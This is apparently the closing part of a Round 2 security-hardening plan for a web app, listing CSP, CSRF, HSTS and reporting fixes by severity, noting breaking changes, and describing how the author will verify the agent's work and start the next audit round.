- H-R2-3: Remove 'unsafe-inline' from CSP style-src
- H-R2-4: Remove analytics.mjashley.com from CSP allow-list (now proxied)
- H-R2-5: Fix index.html drift (proxy analytics in repo, not just in live)

MEDIUM
- M-R2-6: Add /api/csp-report endpoint + Reporting-Endpoints header
- M-R2-7: Narrow img-src wildcard to explicit icon CDN origins
- M-R2-8: Add Trusted Types policy (report-only → enforce)
- M-R2-9: Add CSRF double-submit + X-Requested-With header pattern
- M-R2-10: HSTS preload-ready directive; submit to hstspreload.org

LOW
- L-R2-11: LogViewer whitespace-pre-wrap + ANSI stripping
- L-R2-12: CSP report endpoint deployed before CSP enforcement
- L-R2-13: SECURITY.md Referrer-Policy documentation
- L-R2-14: Note vite version pinning for Round 5

Breaking changes:
- Authorization: Bearer header no longer accepted (cookie only) after deprecation window
- 'unsafe-inline' CSP removed — third-party plugins injecting inline <style> will break

Verification: §4 of round-2 audit MD must pass all assertions on ce-demo.homelabarr.com.
```

---

## §8 — End of Round 2

When the agent reports shipped:
1. I re-run the §4 verification matrix with cache-busting against live.
2. If pass: write Round 3 (auth flow hardening — refresh tokens, MFA, password reset) without asking.
3. If drift / regressions: write Round 2.5 correction MD with WRONG/RIGHT diffs for the specific regressions.

**No questions. Loop continues.**
